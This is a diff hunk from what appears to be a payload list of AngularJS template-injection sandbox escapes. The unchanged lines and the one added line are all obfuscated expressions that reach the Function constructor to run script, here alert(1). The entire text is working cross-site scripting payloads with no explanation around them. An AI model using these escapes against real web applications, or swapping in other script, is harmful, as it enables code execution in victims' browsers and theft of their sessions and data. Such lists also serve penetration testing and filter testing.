@@ -8,3 +8,4 @@
 {{(toString()).constructor.prototype.charAt=(toString()).constructor.prototype.concat;$eval((toString()).constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41))}}
 {{c=[];o=toString();t=o.anchor(true);f=o.anchor(false);c.push(o[5]);c.push(o[1]);c.push(t[3]);c.push(f[12]);c.push(t[9]);c.push(t[10]);c.push(t[11]);c.push(o[5]);c.push(t[9]);c.push(o[1]);c.push(t[10]);a=c.join([]);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[c.join([])].fromCharCode(97,108,101,114,116,40,49,41))()}}
 {{0[a='constructor'][a]('alert(1)')()}}
+{{[].pop.constructor('alert()')()}}
